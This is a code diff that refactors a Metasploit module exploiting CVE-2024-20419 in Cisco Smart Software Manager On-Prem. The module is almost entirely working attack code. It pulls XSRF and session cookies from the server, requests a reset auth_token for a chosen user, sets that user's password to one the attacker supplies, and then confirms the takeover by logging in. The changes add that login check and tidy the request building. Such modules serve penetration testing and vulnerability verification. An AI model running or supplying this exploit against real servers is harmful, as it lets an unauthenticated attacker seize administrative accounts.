@@ -7,12 +7,12 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Cisco Smart Software Manager (SSM) On-Prem Account Takeover (CVE-2024-20419)',
         'Description' => %q{
-          This module exploits an improper access control vulnerability in Cisco Smart Software Manager (SSM) On-Prem <= 8-202206, by changing the
-          password of an existing user to an attacker-controlled one.
+          This module exploits an improper access control vulnerability in Cisco Smart Software Manager (SSM) On-Prem <= 8-202206. An unauthenticated remote attacker
+          can change the password of any existing user, including administrative users.
         },
         'Author' => [
-          'Mohammed Adel', # Discovery and PoC
-          'Michael Heinzl' # MSF Module
+          'Michael Heinzl', # MSF Module
+          'Mohammed Adel' # Discovery and PoC
         ],
         'References' => [
           ['CVE', '2024-20419'],
@@ -58,47 +58,47 @@ class MetasploitModule < Msf::Auxiliary
     unless res
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
-    if res.code == 200
-      print_good('Server reachable.')
-    else
+    unless res.code == 200
       fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
     end
-
-    raw_res = res.to_s
+    print_good('Server reachable.')
 
     # Extract XSRF-TOKEN value
+    raw_res = res.to_s
     xsrf_token_regex = /XSRF-TOKEN=([^;]*)/
     xsrf_token = xsrf_token_regex.match(raw_res)
 
-    if xsrf_token
-      xsrf_token_value = xsrf_token[1]
-      if xsrf_token_value && !xsrf_token_value.empty?
-        decoded_xsrf_token = decode_url(xsrf_token_value)
-        print_good("Retrieved XSRF Token: #{decoded_xsrf_token}")
-      else
-        fail_with(Failure::UnexpectedReply, 'XSRF Token value is null or empty.')
-      end
-    else
+    unless xsrf_token
       fail_with(Failure::UnexpectedReply, 'XSRF Token not found')
     end
+
+    xsrf_token_value = xsrf_token[1]
+    unless xsrf_token_value && !xsrf_token_value.empty?
+      fail_with(Failure::UnexpectedReply, 'XSRF Token value is null or empty.')
+    end
+
+    decoded_xsrf_token = decode_url(xsrf_token_value)
+    print_good("Retrieved XSRF Token: #{decoded_xsrf_token}")
 
     # Extract _lic_engine_session value
     lic_token_regex = /_lic_engine_session=([^;]*)/
     lic_token = lic_token_regex.match(raw_res)
 
-    if lic_token
-      lic_token_value = lic_token[1]
-      if lic_token_value && !lic_token_value.empty?
-        print_good("Retrieved _lic_engine_session: #{lic_token_value}")
-      else
-        fail_with(Failure::UnexpectedReply, '_lic_engine_session value is null or empty.')
-      end
-    else
+    unless lic_token
       fail_with(Failure::UnexpectedReply, '_lic_engine_session not found')
     end
 
+    lic_token_value = lic_token[1]
+    unless lic_token_value && !lic_token_value.empty?
+      fail_with(Failure::UnexpectedReply, '_lic_engine_session value is null or empty.')
+    end
+
+    print_good("Retrieved _lic_engine_session: #{lic_token_value}")
+
     # 2) Request generate_code to retrieve auth_token
-    payload = "{\"uid\": \"#{datastore['USER']}\"}"
+    payload = {
+      uid: datastore['USER']
+    }.to_json
 
     res = send_request_cgi({
       'method' => 'POST',
@@ -107,28 +107,34 @@ class MetasploitModule < Msf::Auxiliary
         'X-Xsrf-Token' => decoded_xsrf_token,
         'Cookie' => "_lic_engine_session=#{lic_token_value}; XSRF-TOKEN=#{decoded_xsrf_token}"
       },
-      'uri' => normalize_uri(target_uri.path, '/backend/reset_password/generate_code'),
+      'uri' => normalize_uri(target_uri.path, 'backend/reset_password/generate_code'),
       'data' => payload
     })
 
     unless res
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
-    if res.code == 200
-      json = res.get_json_document
-      if json.key?('error_message')
-        fail_with(Failure::UnexpectedReply, json['error_message'])
-      elsif json.key?('auth_token')
-        print_good('Retrieved auth_token: ' + json['auth_token'])
-      end
-    else
+    unless res.code == 200
       fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
+    end
+
+    json = res.get_json_document
+    if json.key?('error_message')
+      fail_with(Failure::UnexpectedReply, json['error_message'])
+    elsif json.key?('auth_token')
+      print_good('Retrieved auth_token: ' + json['auth_token'])
     end
 
     auth_token = json['auth_token']
 
     # 3) Request reset_password to change the password of the specified user
-    payload = "{\"uid\": \"#{datastore['USER']}\", \"auth_token\": \"#{auth_token}\", \"password\": \"#{datastore['NEW_PASSWORD']}\", \"password_confirmation\": \"#{datastore['NEW_PASSWORD']}\", \"common_name\": \"\"}"
+    payload = {
+      uid: datastore['USER'],
+      auth_token: auth_token,
+      password: datastore['NEW_PASSWORD'],
+      password_confirmation: datastore['NEW_PASSWORD'],
+      common_name: ''
+    }.to_json
 
     res = send_request_cgi({
       'method' => 'POST',
@@ -137,7 +143,7 @@ class MetasploitModule < Msf::Auxiliary
         'X-Xsrf-Token' => decoded_xsrf_token,
         'Cookie' => "_lic_engine_session=#{lic_token_value}; XSRF-TOKEN=#{decoded_xsrf_token}"
       },
-      'uri' => normalize_uri(target_uri.path, '/backend/reset_password'),
+      'uri' => normalize_uri(target_uri.path, 'backend/reset_password'),
       'data' => payload
     })
 
@@ -145,16 +151,44 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
 
-    if res.code == 200
-      json = res.get_json_document
-      if json.key?('error_message')
-        fail_with(Failure::UnexpectedReply, json['error_message'])
-      else
-        store_valid_credential(user: datastore['USER'], private: datastore['NEW_PASSWORD'], proof: json)
-        print_good("Password for the #{datastore['USER']} user was successfully updated: #{datastore['NEW_PASSWORD']}")
-        print_good("Login at: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}/#/logIn?redirectURL=%2F") end
-    else
+    unless res.code == 200
       fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
     end
+
+    json = res.get_json_document
+    if json.key?('error_message')
+      fail_with(Failure::UnexpectedReply, json['error_message'])
+    end
+
+    # 4) Confirm that we can authenticate with the new password
+    payload = {
+      username: datastore['USER'],
+      password: datastore['NEW_PASSWORD']
+    }.to_json
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'ctype' => 'application/json',
+      'headers' => {
+        'X-Xsrf-Token' => decoded_xsrf_token,
+        'Accept' => 'application/json',
+        'Cookie' => "_lic_engine_session=#{lic_token_value}; XSRF-TOKEN=#{decoded_xsrf_token}"
+      },
+      'uri' => normalize_uri(target_uri.path, 'backend/auth/identity/callback'),
+      'data' => payload
+    })
+
+    unless res.code == 200
+      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
+    end
+
+    json = res.get_json_document
+    unless json.key?('uid') && json['uid'] == datastore['USER']
+      fail_with(Failure::UnexpectedReply, json['error_message'])
+    end
+
+    store_valid_credential(user: datastore['USER'], private: datastore['NEW_PASSWORD'], proof: json)
+    print_good("Password for the #{datastore['USER']} user was successfully updated: #{datastore['NEW_PASSWORD']}")
+    print_good("Login at: #{full_uri(normalize_uri(target_uri, '#/logIn?redirectURL=%2F'))}")
   end
 end
